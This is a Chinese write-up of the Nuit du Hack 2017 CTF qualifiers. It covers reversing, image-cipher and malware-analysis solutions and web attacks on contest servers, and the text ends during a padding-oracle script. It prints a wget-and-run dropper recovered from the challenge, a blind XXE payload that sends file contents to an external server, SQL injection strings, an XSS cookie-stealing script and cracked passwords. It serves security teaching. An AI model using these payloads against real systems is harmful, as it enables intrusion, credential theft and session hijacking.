> 原文链接: https://www.anquanke.com//post/id/85852 


# 【CTF 攻略】法国年度黑客竞赛：Nuit du Hack 2017 Writeup


                                阅读量   
                                **163135**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p5.ssl.qhimg.com/t018b9f2ff6298e47f9.jpg)](https://p5.ssl.qhimg.com/t018b9f2ff6298e47f9.jpg)**

**竞赛官网：**[**https://quals.nuitduhack.com/**](https://quals.nuitduhack.com/)** **

****

作者：[**FlappyPig**](http://bobao.360.cn/member/contribute?uid=1184812799)

预估稿费：600RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**Matriochka step 1**

主要逻辑在这里：

[![](https://p4.ssl.qhimg.com/t01b2350086d96c70e7.png)](https://p4.ssl.qhimg.com/t01b2350086d96c70e7.png)

非常简单，字符串倒序然后和一个字符串比较，直接讲T开头字符串倒序就是flag。

<br>

**step2**

用了个int 3产生sigtrap信号，在信号处理函数中进行+1或者-1操作。



```
from zio import *
value = [0x0FF6FEAFE,0x0CDAF4DB6,0x8D9A9B17,0x83A147A7,0x7AD24DCA,0x0C99CA1B9,0x71CEAC15,0x932C2931]
flag = 'W'
key = 0xdeadbeef
for v in value:
    c = v^key
    key = v
    flag += l32(c)
flag2 = 'W'
for i in range(len(flag)-1):
    if ord(flag[i])&amp;1:
        flag2 += chr((ord(flag[i])+ord(flag[i+1]))&amp;0xff)
    else:
        flag2 += chr((ord(flag[i+1])-ord(flag[i])+0x100)&amp;0xff)
print flag2
```



**step3**

进行了类似base64运算。不过每次运算用的字符串表在动态改变。



```
import base64
import os
from zio import *
f = open('./step3.bin', 'rb')
d = f.read()[0x16e3:].split('x00')[0]
f.close()
base_table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
def spec_base64(d, s):
    dict = `{``}`
    for i in range(64):
        dict[s[i]]= base_table[i]
    dict['='] = '='
    d2 = ''
    for j in range(len(d)):
        d2 += dict[d[j]]
    return base64.b64decode(d2)
v = 0x1457893
def get_index():
    global v
    v = ((v * 0x539) &amp; 0xffffffff) % 0x7FFFFFFF
    return v&amp;0x3f
s0 = []
for i in range(64):
    s0.append(base_table[i])
ss = []
for i in range(16):
    for j in range(50):
        index1 = get_index()
        index2 = get_index()
        tmp = s0[index1]
        s0[index1] = s0[index2]
        s0[index2] = tmp
    ss.append(''.join(s for s in s0))
print len(ss)
for i in range(16):
    d = spec_base64(d, ss[15-i])
    print d
key2 = 'platypus'
flag = ''
for i in range(len(d)):
    flag += chr(ord(d[i])^ord(key2[i%8]))
key1 = 'pony'
flag2 = ''
for i in range(len(flag)):
    flag2 += chr(ord(flag[i])^ord(key1[i%4]))
print flag2
os.popen('./step3.bin JonSn0wIsDead!AndDealWithIt! 2&gt;step4_2.bin')
```



**step4**

层层异或解密代码，写了个idapython脚本自动化还原。



```
from idaapi import *
from idc import *
from idautils import *
def decrypt(start, end, xor_data):
    for i in range(start, end):
        a = get_byte(i)
        patch_byte(i, a^xor_data)
def xor_dec(ea, is_patch):
    MakeCode(ea)
    count = 0
    count2 = 0
    start1 = None
    end1 = None
    start2 = None
    end2 = None
    key = None
    for i in range(0x200):
        if (Byte(ea) == 0x48) &amp; (Byte(ea+1) == 0x8d) &amp; (Byte(ea+2) == 0x05): #lea rax
            MakeCode(ea)
            if count == 0:
                start1 = GetOperandValue(ea, 1)
            elif count == 1:
                end1 = GetOperandValue(ea, 1)
            elif count == 4:
                start2 = GetOperandValue(ea, 1)
            elif count == 5:
                end2 = GetOperandValue(ea, 1)
                break
            count += 1
        if (Byte(ea) == 0x83) &amp; (Byte(ea+1) == 0xf0): #xor
            MakeCode(ea)
            if count2 == 0:
                key = GetOperandValue(ea, 1)&amp;0xff
            count2 += 1
        ea += 1
    if start1 is None:
        return None
    if end1 is None:
        return None
    if start2 is None:
        return None
    if end2 is None:
        return None
    if key is None:
        return None
    print hex(start1), hex(end1), hex(start2), hex(end2), hex(key)
    if is_patch:
        #decrypt(start1, end1, key)
        decrypt(start2, end2, key)
    return start2
def find_header(ea):
    for i in range(0x200):
        if Byte(ea) == 0xe9: #jmp
            if (Byte(ea-2) == 0x74) &amp; (Byte(ea-1) == 0x05):
                MakeCode(ea)
                PatchByte(ea-1, 0x90)
                PatchByte(ea-2, 0x90)
                print hex(ea)
                return GetOperandValue(ea, 0)
            if (Byte(ea-2) == 0x90) &amp; (Byte(ea-1) == 0x90):
                MakeCode(ea)
                PatchByte(ea-1, 0x90)
                PatchByte(ea-2, 0x90)
                print hex(ea)
                return GetOperandValue(ea, 0)
        if Byte(ea) == 0xeb: #jmp
            if (Byte(ea-2) == 0x74) &amp; (Byte(ea-1) == 0x02):
                MakeCode(ea)
                PatchByte(ea-1, 0x90)
                PatchByte(ea-2, 0x90)
                print hex(ea)
                return GetOperandValue(ea, 0)
        ea += 1
    return None
ea = 0x400ccf
#ea = 0x40bc52
ea = 0x000000000040089D
while True:
    ea = find_header(ea)
    if ea is None:
        break
    print hex(ea)
    ea = xor_dec(ea, 1)
    if ea is None:
        break
    print hex(ea)
print 'finished'
```

在解压出来的代码中，共176次比较，均需要满足。



```
import os
f = open('./and_data.txt', 'r')
and_values = []
for line in f:
    line = line.strip()
    if line:
        value = int(line.split(',')[1].strip('h'), 16)
        and_values.append(value)
f.close()
print len(and_values)
f = open('./cmp_data.txt', 'r')
cmp_values = []
for line in f:
    line = line.strip()
    if line:
        value = int(line.split(',')[1].strip('h'), 16)
        cmp_values.append(value)
f.close()
print len(cmp_values)
def brute(c, andv):
    v5 = 0xffffffff
    for i in range(2):
        v5 ^= ord(c[i])
        for j in range(8):
            if v5&amp;1:
                v5 = (v5&gt;&gt;1)^(0xffffffff&amp;andv)
            else:
                v5 = (v5&gt;&gt;1)^(0&amp;andv)
    return v5
def test(andv, cmpv):
    for c1 in range(0x100):
        for c2 in range(0x100):
            c = chr(c1) + chr(c2)
            ret = brute(c, andv)
            #print hex(ret)
            if ret + cmpv == 0xffffffff:
                return c
    return None
input = ''
for i in range(167):
    c = test(and_values[i], cmp_values[i])
    input += c
f = open('./step4.input', 'wb')
f.write(input)
f.close()
```



**Codetalkers**

首先是一个gif，给了很多简单的图案，有重复的，根据题目的意思和第一张和最后一张进行猜测，猜测为利用图案进行单表替换的加密，类似于福尔摩斯的跳舞的小人。密码学部分简单，那么下面最关键的问题是图片处理了。我们需要对图片进行处理，首先将gif切分：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01edc855d2c02eaa06.png)

去掉开始和最后的文字图片，一共将一个gif图片切分为了1245个bmp文件。可以看到在这些图片中有很多图案的形状是重复的，但是颜色和大小都不是重复的，我试了一下直接对这些图片进行相似识别，现有的py很难分得很好，所以我决定对图片进行进一步处理。接下来，我们去掉颜色，将图片转为纯粹的黑白二色图片，连灰度都不要：



```
def padlen(a):
    return "0"*(5-len(str(a)))+str(a)
from PIL import Image
def RGB2BlackWhite(filename,savename):
    im = Image.open(filename)
    print "image info,", im.format, im.mode, im.size
    (w, h) = im.size
    R = 0
    G = 0
    B = 0
    for x in xrange(w):
        for y in xrange(h):
            pos = (x, y)
            rgb = im.getpixel(pos)
            (r, g, b) = rgb
            R = R + r
            G = G + g
            B = B + b
    rate1 = R * 1000 / (R + G + B)
    rate2 = G * 1000 / (R + G + B)
    rate3 = B * 1000 / (R + G + B)
    print "rate:", rate1, rate2, rate3
    for x in xrange(w):
        for y in xrange(h):
            pos = (x, y)
            rgb = im.getpixel(pos)
            (r, g, b) = rgb
            n = r * rate1 / 1000 + g * rate2 / 1000 + b * rate3 / 1000
            # print "n:",n
            if n &gt;= 10:
                im.putpixel(pos, (255, 255, 255))
            else:
                im.putpixel(pos, (0, 0, 0))
    im.save(savename)
for i in range(1,1246):
    im="codetalkers.gif.ifl/IMG"+padlen(i)+".bmp"
    imsave='bw/'+str(i)+".bmp"
    RGB2BlackWhite(im,imsave)
```

经过这个脚本转换后，我将图片转为了纯粹的黑白图片：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ed7118e47885acde.png)

这里要注意rgb的阈值的选取，可以边测试边调整，发现如果图片全黑那么说明选取的值偏大，可以进行调节，保证有白色的图案出来。

这样转换完成后，还是有问题，就是图案的大小和顺序是不一样的，所以我又找了个图片裁剪的函数，将周围的黑边去掉，并把裁剪完的图片调节为固定大小：



```
import Image, ImageChops
def autoCrop(image,backgroundColor=None):
    '''Intelligent automatic image cropping.
       This functions removes the usless "white" space around an image.
       If the image has an alpha (tranparency) channel, it will be used
       to choose what to crop.
       Otherwise, this function will try to find the most popular color
       on the edges of the image and consider this color "whitespace".
       (You can override this color with the backgroundColor parameter)
       Input:
            image (a PIL Image object): The image to crop.
            backgroundColor (3 integers tuple): eg. (0,0,255)
                 The color to consider "background to crop".
                 If the image is transparent, this parameters will be ignored.
                 If the image is not transparent and this parameter is not
                 provided, it will be automatically calculated.
       Output:
            a PIL Image object : The cropped image.
    '''
    def mostPopularEdgeColor(image):
        ''' Compute who's the most popular color on the edges of an image.
            (left,right,top,bottom)
            Input:
                image: a PIL Image object
            Ouput:
                The most popular color (A tuple of integers (R,G,B))
        '''
        im = image
        if im.mode != 'RGB':
            im = image.convert("RGB")
        # Get pixels from the edges of the image:
        width,height = im.size
        left   = im.crop((0,1,1,height-1))
        right  = im.crop((width-1,1,width,height-1))
        top    = im.crop((0,0,width,1))
        bottom = im.crop((0,height-1,width,height))
        pixels = left.tobytes() + right.tobytes() + top.tobytes() + bottom.tobytes()
        # Compute who's the most popular RGB triplet
        counts = `{``}`
        for i in range(0,len(pixels),3):
            RGB = pixels[i]+pixels[i+1]+pixels[i+2]
            if RGB in counts:
                counts[RGB] += 1
            else:
                counts[RGB] = 1
        # Get the colour which is the most popular:
        mostPopularColor = sorted([(count,rgba) for (rgba,count) in counts.items()],reverse=True)[0][1]
        return ord(mostPopularColor[0]),ord(mostPopularColor[1]),ord(mostPopularColor[2])
    bbox = None
    # If the image has an alpha (tranparency) layer, we use it to crop the image.
    # Otherwise, we look at the pixels around the image (top, left, bottom and right)
    # and use the most used color as the color to crop.
    # --- For transparent images -----------------------------------------------
    if 'A' in image.getbands(): # If the image has a transparency layer, use it.
        # This works for all modes which have transparency layer
        bbox = image.split()[list(image.getbands()).index('A')].getbbox()
    # --- For non-transparent images -------------------------------------------
    elif image.mode=='RGB':
        if not backgroundColor:
            backgroundColor = mostPopularEdgeColor(image)
        # Crop a non-transparent image.
        # .getbbox() always crops the black color.
        # So we need to substract the "background" color from our image.
        bg = Image.new("RGB", image.size, backgroundColor)
        diff = ImageChops.difference(image, bg)  # Substract background color from image
        bbox = diff.getbbox()  # Try to find the real bounding box of the image.
    else:
        raise NotImplementedError, "Sorry, this function is not implemented yet for images in mode '%s'." % image.mode
    if bbox:
        image = image.crop(bbox)
    return image
for i in range(1,1246):
    im = Image.open('bw/'+str(i)+'.bmp')
    cropped = autoCrop(im)
    cropped=cropped.resize((80, 80), Image.ANTIALIAS)
    cropped.save('min/'+str(i)+'.bmp')
```

调节过后达到了如下效果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c8ca47b10bf807bb.png)

这样处理过后，再进行图案的比对分析，网上的脚本基本均可使用，相同图片和不同图片的差异在30倍以上。最后我将相同的图案用一种字母代替，得到了图片到字符串的转换结果，发现一共有26种不同图案，正好对应26个字母。



```
from itertools import izip
import Image
def padlen(a):
    return "0"*(5-len(str(a)))+str(a)
def check(num1,num2):
    i1 = Image.open("min/"+str(num1)+".bmp")
    i2 = Image.open("min/"+str(num2)+".bmp")
    assert i1.mode == i2.mode, "Different kinds of images."
    assert i1.size == i2.size, "Different sizes."
    pairs = izip(i1.getdata(), i2.getdata())
    if len(i1.getbands()) == 1:
        dif = sum(abs(p1 - p2) for p1, p2 in pairs)
    else:
        dif = sum(abs(c1 - c2) for p1, p2 in pairs for c1, c2 in zip(p1, p2))
    ncomponents = i1.size[0] * i1.size[1] * 3
    return (dif / 255.0 * 100) / ncomponents
import string
charlist=string.printable
charlist="abcdefghijklmnopqrstuvwxyz"
misc=['0']*1246
p=0
for i in range(1,1246):
    print i
    if misc[i]=='0':
        misc[i]=charlist[p]
        for j in range(i+1,1246):
            te=check(i,j)
            if misc[j]=='0' and te&lt;15:
                misc[j]=charlist[p]
            if te&gt;10 and te&lt;15:
                print i,j
                print "sth error"
                raw_input()
        p += 1
print "".join(misc)
```

这样转换完成后，我们可以对得到的字符串在quipquip上破解单表替代密码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017f4edae4aafc2983.png)

最后的空格去掉就是flag。

<br>

**From Russia with Love**

分析dump.img中的程序，发现将第2扇区开始的几个扇区读入到0x1000处，然后跳转到0x1200执行。最后发现会向shell脚本中插入一些字符，插入的代码如下。同时通过ultraiso可以从dump.img中提取得到一个picture.bmp文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01788e538739336ff8.png)



```
f = open('./dump2.img', 'rb')
d = f.read()[0x7e7:].split('x00')[0]
f.close()
s = ''
for i in range(len(d)):
    s += chr(ord(d[i])^0x90)
print s
```

得到的字符串为:

```
wget http://fromrussiawithlove.quals.nuitduhack.com/yzaegrdsfhvzey.txt -O /tmp/b 2&gt; /dev/null &gt; /dev/null; cat /tmp/b | base64 -d &gt; /tmp/a 2&gt; /dev/null; chmod +x /tmp/a 2&gt; /dev/null; /tmp/a &amp;
```

下载得到的/tmp/a为一个elf，将一个lib文件写入了一个/lib/lib_preload。

[![](https://p3.ssl.qhimg.com/t01d3b6835203ea1263.png)](https://p3.ssl.qhimg.com/t01d3b6835203ea1263.png)



```
f = open('./a.bin', 'rb')
d = f.read()[0x3ec0:0x3ec0+0xa518]
f.close()
key = 'NDH2017'
d2 = ''
for i in range(0xa518):
    d2 += chr(ord(d[i])^ord(key[i%7]))
print d2
f = open('ldpreload', 'wb')
f.write(d2)
f.close()
```

分析ld_preload库文件，发现chmod中存在一定条件下会调用chiffreFiles函数。在chiffreFiles中会对文件进行加密。

[![](https://p2.ssl.qhimg.com/t01eb0d75a594362b06.png)](https://p2.ssl.qhimg.com/t01eb0d75a594362b06.png)

密钥由17个字节计算crc32得到的64个字节key。

文件加密过程为生成65字节IV，然后再进行异或。写入到文件中的数据为

```
IV+l64(length)+enc_buff
```

[![](https://p0.ssl.qhimg.com/t0140a2a37fd6629107.png)](https://p0.ssl.qhimg.com/t0140a2a37fd6629107.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016c9861fb56dd0020.png)

由于密钥是由两个字符crc32得到的，同时bmp的头部有部分内容是固定的。因此可以根据bmp中固定的部分，得到可能的key值，然后判断key值是否为两个字符的crc32。

一个bmp的头部大致如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01797714bea01bf975.png)

最后这样能算出36位key，将key通过补x00补到64位，解密picture.bmp文件，发现文件中有大块的0xff值，如下图所示。因此根据这些非0xff值可以得到完整的key。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0159efda426e7bdf69.png)



```
from zio import *
def crc32(c):
    v5 = 0xffffffff
    for i in range(2):
        v5 ^= ord(c[i])
        for j in range(8):
            if v5&amp;1:
                v5 = (v5&gt;&gt;1)^(0xffffffff&amp;0xEDB88320)
            else:
                v5 = (v5&gt;&gt;1)^(0&amp;0xEDB88320)
    v5 = 0xffffffff -v5
    return v5
crc32_table = `{``}`
for c0 in range(0x80):
    for c1 in range(0x80):
        s = chr(c0) + chr(c1)
        crc32_table[crc32(s)] = s
bmp_header ='''
42 4D 7A 53 07 00 00 00 00 00 ?? 00 00 00 ?? 00
00 00 ?? ?? 00 00 ?? ?? 00 00 01 00 ?? 00 00 00
00 00 00 ??
'''
bmp_header = bmp_header.replace('n', '').replace(' ', '')
print bmp_header
f = open('./dump2.img', 'rb')
d = f.read()[0x7e7:].split('x00')[0]
f.close()
f = open('./picture.bmp', 'rb')
d = f.read()
f.close()
IV = d[0:0x41]
length = l64(d[0x41:0x49])
def find_tmp_key(tmp_key):
    for key,value in crc32_table.items():
        find = True
        for i in range(4):
            if tmp_key.has_key(i):
                if tmp_key[i] != (l32(key)[i]):
                    find = False
                    break
        if find:
            return key, value
    return None, None
data = d[0x49:]
input = ''
key = ''
for i in range(len(bmp_header)/8):
    data = bmp_header[8*i:8*i+8]
    tmp_key = `{``}`
    for j in range(4):
        v = data[j*2:j*2+2]
        try:
            c = int(v, 16)
            tmp_key[j] = chr(ord(d[0x49+i*4+j])^c^ord(IV[(4*i+j)%41]))
        except:
            pass
    k, s = find_tmp_key(tmp_key)
    if input:
        input += s[1:]
    else:
        input = s
    key += l32(k)
def decrypt_bmp(d, key):
    IV = d[:0x41]
    d3 = ''
    for i in range(length):
        d3 += chr(ord(d[i + 0x49]) ^ ord(IV[i % 0x41]) ^ ord(key[i % 0x40]))
    f = open('a4.bmp', 'wb')
    f.write(d3)
    f.close()
dds = '5E 9F BD F2 CA 53 44 24 C4 54 8B 5B 0D D6 97 A71D 8C 09 4A 09 B6 31 EA 6E 5D C0 B8'.replace(' ', '').decode('hex')
for ds in dds:
    key += chr(0xff^ord(ds))
#key = key.ljust(0x40, 'x00')
decrypt_bmp(d, key)
flag = ''
for i in range(len(key)/4):
    if flag:
        flag += crc32_table[l32(key[i*4:i*4+4])][1:]
    else:
        flag = crc32_table[l32(key[i*4:i*4+4])]
print flag
```



**No Pain No Gain**

进去发现是一个上传页面，上传csv，进行转换，fuzz时候得到过这样的错误

[![](https://p0.ssl.qhimg.com/t01e14b88833a761a68.png)](https://p0.ssl.qhimg.com/t01e14b88833a761a68.png)

所以猜测是xxe,  

然后尝试一波之后没有想法,一直都报错,后来才知道,报错是没关系的,因为已经执行了,所以是一个 blind xxe   

然后直接用里面的payload改一该就好了,提交的文件内容如下:



```
&lt;!DOCTYPE ANY [
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"&gt;
&lt;!ENTITY % xxe SYSTEM "http://104.160.43.154:8000/evil.dtd"&gt; %xxe;%send; ]&gt;
&lt;!-- Invitations --&gt;
id,name,email
```

然后vps上的evil.dtd内容如下：



```
&lt;!ENTITY % all
"&lt;!ENTITY % send SYSTEM 'http://104.160.43.154:8000/xss/?file=%file;'&gt;"
&gt;
%all;
```

成功获取到hosts的内容,那么开始寻找 flag ,最后是在 /home/flag/flag 里面,  

最后截图如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eadf73b0b22457aa.png)

<br>

**Slumdog Millionaire**

从题目获取代码如下：



```
#!/usr/bin/python2.7
import random
import config
import utils
random.seed(utils.get_pid())
ngames = 0
def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers
def reset_jackpot():
    random.seed(utils.get_pid())
    utils.set_jackpot(0)
    ngames = 0
def draw(user_guess):
    ngames += 1
    if ngames &gt; config.MAX_TRIES:
        reset_jackpot()
    winning_combination = generate_combination()
    if winning_combination == user_guess:
        utils.win()
        reset_jackpot()
```

查看之后发现,要是我们知道了 seed 即那个进程的pid,那么就能预测所有的组合,所以先在网页随便输入一串东西,然后得到第一次的正确答案,这里我得到的是 56-08-50-98-94-51-01-75-63-61   

然后运行如下代码就好了



```
import random
def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers
seed=0
for i in xrange(1,10000):
    random.seed(i)
    ret = generate_combination()
    print ret
    if (ret == '56-08-50-98-94-51-01-75-63-61'):
        print 'find',i
        seed=i
        break
random.seed(seed)
ans=generate_combination()
ans=generate_combination()
print ans
```

得到ans提交就拿到flag了 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014d896fece9e5d0b3.png)

<br>

**Divide and rule**

首先点进去是个登陆页面，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0187a18ea3d03950dc.png)

然后去 search 那儿找东西  

发现那一堆查询参数是存在注入的,随便加个单引号就不返回值了。  

然后尝试联合查询发现还是不返回,后来想到这么多参数很可能是长度受了限制,然后就分开来,最后测试成功,如下:

```
firstname='union select/*&amp;lastname=*/1,2,3,4,5,6#&amp;position=&amp;country=123&amp;gender=
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bceb421db5bed892.png)

但是有一个问题就是,长度限制后来测出来好像是15,这样子没办法查表名和列名之类的,因为 information_schema 太长了。  

后来脑洞了一下猜到表名是 users ,  

然后根据初始登录页面的name猜到字段名分别是 login 和 password



```
firstname='union select/*&amp;lastname=*/login/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=
firstname='union select/*&amp;lastname=*/password/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=
```

得到三个用户名和三个md5的密码值,MD5解密之后登陆就拿到flag了



```
#三个用户名
ruleradmin
patrick
raoul
#三个密码
04fc95a5debc7474a84fad9c50a1035d #smart1985
db6eab0550da4b056d1a33ba2e8ced66 #1badgurl
7ac89e3c1f1a71ee19374d7e8912714b #1badboy
```

[![](https://p5.ssl.qhimg.com/t01bb5ab35b6193197a.png)](https://p5.ssl.qhimg.com/t01bb5ab35b6193197a.png)

<br>

**Purple Posse Market**

进去之后研究半天,发现有一个contact页面可以提交一些东西,然后其他好像也没有太多用,题目描述让拿到管理员的IBAN账户。那多半是xss拿到cookie登陆后台了,然后在评论这里尝试提交,发现根本没有过滤,下面代码直接就能返回。

```
&lt;script src="http://你的xss平台"&gt;&lt;/script&gt;
```

回到题目，既然没有过滤，那么直接执行js就好了，提交如下：

```
&lt;script src="http://你的网址/requests.js"&gt;&lt;/script&gt;
```

然后这个 request.js 这样写的

```
$.get("http://你的xss平台?a="+document.cookie,function(data,status)`{``}`)
```

截图如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0193234f648d0a4847.png)

登陆进去就能看到IBAN账户,这就是flag了。

<br>

**WhyUNoKnock**

一道挺有意思的题目，网址进去是一个登陆页面，登陆时候输入了3个参数，login password group，前两个参数用户名和密码简单测试应该没问题，然后第三个参数，更改为其他字符就提示 PDOException : 1044 一开始猜测是表名注入，但是测试各种payload发现不符合sql语句的规范。后来本地测试的时候发现输入点可能在利用pdo连接数据库的时候选择的配置。然后猜测能够覆盖掉pdo的其他配置，输入group=users;host=test.dns.log:1234;然后有dns的记录和tcp请求的记录，证明输入点的确在这个位置。但是我们不知道数据库密码和数据库结构怎么办呢？心里有两个选项: 1.虽然他想连接一个mysql服务，但是我们不一定要给他一个真的mysql，可以自己写一个fake mysql server或者在真正mysql返回的时候抓包替换返回值为自己构造的数据。2.修改mysql的配置解决这两个问题:先是利用参数skip-grant-table可以跳过认证，然后设置mysql日志抓取sql记录，然后通过sql去建立相应的数据库。这里选择了第二个方式。最后的sql日志如图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0176e71c7a376827f8.png)

erpay即为服务器连接时的用户名，然后执行了一个select语句，通过构造出相应的admins数据库，增加一条记录，就能成功登陆，拿到flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016302ecf18f2efd85.png)

<br>

**MarkIsFaillingDownDrunk**

进去之后随便点一个，发现链接变成这个

[http://markisfaillingdowndrunk.quals.nuitduhack.com/view/deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02](http://markisfaillingdowndrunk.quals.nuitduhack.com/view/deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02) 

这一看都不用想，80%是`padding oracle`，

然后开始写代码，先把他的几串东西的明文搞出来，代码如下：



```
import requests
import base64
import time
url='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result
def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)
def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=inject(c.encode('hex'))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
